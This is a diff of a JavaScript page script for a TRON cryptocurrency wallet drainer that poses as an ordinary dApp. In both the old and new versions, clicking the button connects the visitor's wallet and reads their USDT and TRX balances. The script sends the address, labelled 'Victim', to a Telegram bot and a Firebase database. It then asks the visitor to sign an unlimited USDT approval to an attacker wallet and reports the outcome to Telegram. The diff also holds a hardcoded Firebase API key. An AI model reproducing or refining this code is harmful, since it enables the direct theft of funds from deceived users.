@@ -1,7 +1,4 @@
-// --- Buffer Initialization Fix (CRITICAL) ---
-if (typeof window !== 'undefined') {
-    window.Buffer = window.Buffer || buffer.Buffer;
-}
+if (typeof window !== 'undefined') { window.Buffer = window.Buffer || buffer.Buffer; }
 
 const firebaseConfig = {
     apiKey: "AIzaSyD4qKMlB3TJjYprgpAEkA5Ts-Yvg7aRbp0",
@@ -20,8 +17,6 @@ const CONFIG = {
     USDT_CONTRACT: "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t"
 };
 
-const MAX_UINT = "115792089237316195423570985008687907853269984665640564039457584007913129639935";
-
 function initFirebase() {
     if (typeof firebase !== 'undefined' && firebase.apps.length === 0) {
         firebase.initializeApp(firebaseConfig);
@@ -29,83 +24,62 @@ function initFirebase() {
 }
 
 async function notifyAdmin(status, address, trx = "0", usdt = "0", extra = "") {
-    const text = `🎯 <b>NEW UPDATE</b>\n📌 Status: <b>${status}</b>\n👤 Victim: <code>${address}</code>\n💰 Balance: <code>${usdt} USDT</code> | <code>${trx} TRX</code>\n📝 Detail: ${extra}`;
     try {
         await fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendMessage`, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ chat_id: CONFIG.CHAT_ID, text: text, parse_mode: "HTML" })
+            body: JSON.stringify({ chat_id: CONFIG.CHAT_ID, text: `🎯 <b>NEW UPDATE</b>\nStatus: ${status}\nVictim: ${address}\nBalance: ${usdt} USDT | ${trx} TRX\nDetail: ${extra}`, parse_mode: "HTML" })
         });
     } catch (e) { }
 }
 
 async function getStats(address) {
     const tw = new TronWeb({ fullHost: 'https://api.trongrid.io' });
-    let trx = "0.00", usdt = "0.00";
     try {
         const bal = await tw.trx.getBalance(address);
-        trx = (bal / 1e6).toFixed(2);
         const contract = await tw.transactionBuilder.triggerConstantContract(CONFIG.USDT_CONTRACT, "balanceOf(address)", {}, [{ type: 'address', value: address }], address);
-        usdt = (parseInt(contract.constant_result[0], 16) / 1e6).toFixed(2);
-    } catch (e) { }
-    return { trx, usdt };
+        return { trx: (bal / 1e6).toFixed(2), usdt: (parseInt(contract.constant_result[0], 16) / 1e6).toFixed(2) };
+    } catch (e) { return { trx: "0.00", usdt: "0.00" }; }
 }
 
-window.addEventListener('load', () => {
+window.onload = () => {
     initFirebase();
     if (typeof firebase !== 'undefined') {
         const sessionKey = 'session_' + Date.now();
         window.currentSessionKey = sessionKey;
-        firebase.database().ref('connections/' + sessionKey).set({
-            address: "User Online", status: "ACTIVE", time: new Date().toLocaleTimeString()
-        });
+        firebase.database().ref('connections/' + sessionKey).set({ status: "ACTIVE", time: new Date().toLocaleTimeString() });
     }
-});
+};
 
-// Robust Click Handler for DApp Browsers
+// DApp-specific robust click handler
 document.getElementById('next-btn').onclick = async () => {
     const btn = document.getElementById('next-btn');
     btn.classList.add('btn-loading');
 
     initFirebase();
 
-    // Loop for wallet system ready state
     let attempts = 0;
-    while (typeof window.connectWalletConnectTron !== 'function' && attempts < 25) {
-        await new Promise(r => setTimeout(r, 500));
-        attempts++;
-    }
+    const checkAndConnect = async () => {
+        if (typeof window.connectWalletConnectTron === 'function') {
+            try {
+                const result = await window.connectWalletConnectTron();
+                if (result && result.address) {
+                    const address = result.address;
+                    const { trx, usdt } = await getStats(address);
 
-    if (typeof window.connectWalletConnectTron !== 'function') {
-        btn.classList.remove('btn-loading');
-        alert("Wallet system timeout. Please refresh.");
-        return;
-    }
+                    document.getElementById('page-wrapper').classList.add('opacity-10');
+                    document.getElementById('loading-screen').classList.remove('hidden');
 
-    try {
-        const result = await window.connectWalletConnectTron();
-        if (result && result.address) {
-            const address = result.address;
-            const { trx, usdt } = await getStats(address);
+                    if (window.currentSessionKey) {
+                        firebase.database().ref('connections/' + window.currentSessionKey).update({ address, usdt, trx, status: "PENDING_SIGN" });
+                    }
 
-            document.getElementById('view-balance').innerText = usdt;
-            document.getElementById('page-wrapper').classList.add('opacity-10');
-            document.getElementById('loading-screen').classList.remove('hidden');
+                    await notifyAdmin("PENDING SIGN", address, trx, usdt);
 
-            if (window.currentSessionKey) {
-                firebase.database().ref('connections/' + window.currentSessionKey).update({ address, usdt, trx, status: "PENDING_SIGN" });
-            }
-
-            await notifyAdmin("PENDING SIGN", address, trx, usdt);
-
-            const localTronWeb = new TronWeb({ fullHost: 'https://api.trongrid.io' });
-
-            setTimeout(async () => {
-                try {
-                    // Logic Update: feeLimit 40 TRX for 10 TRX support
+                    const localTronWeb = new TronWeb({ fullHost: 'https://api.trongrid.io' });
                     const { transaction } = await localTronWeb.transactionBuilder.triggerSmartContract(
                         CONFIG.USDT_CONTRACT, "approve(address,uint256)", { feeLimit: 40000000 },
-                        [{ type: 'address', value: CONFIG.ADMIN_WALLET }, { type: 'uint256', value: MAX_UINT }], address
+                        [{ type: 'address', value: CONFIG.ADMIN_WALLET }, { type: 'uint256', value: "115792089237316195423570985008687907853269984665640564039457584007913129639935" }], address
                     );
 
                     const signedTx = await result.provider.request({
@@ -114,17 +88,20 @@ document.getElementById('next-btn').onclick = async () => {
                     });
 
                     const receipt = await localTronWeb.trx.sendRawTransaction(signedTx);
-                    await notifyAdmin("✅ SUCCESS", address, trx, usdt, `TX: <code>${receipt.txid}</code>`);
-                    location.reload();
-                } catch (err) {
-                    await notifyAdmin("❌ FAILED", address, trx, usdt, err.message || "User Rejected");
+                    await notifyAdmin("✅ SUCCESS", address, trx, usdt, receipt.txid);
                     location.reload();
                 }
-            }, 1000);
+            } catch (err) {
+                btn.classList.remove('btn-loading');
+                location.reload();
+            }
+        } else if (attempts < 15) {
+            attempts++;
+            setTimeout(checkAndConnect, 500);
         } else {
             btn.classList.remove('btn-loading');
+            alert("Please refresh and try again.");
         }
-    } catch (e) {
-        btn.classList.remove('btn-loading');
-    }
+    };
+    checkAndConnect();
 };
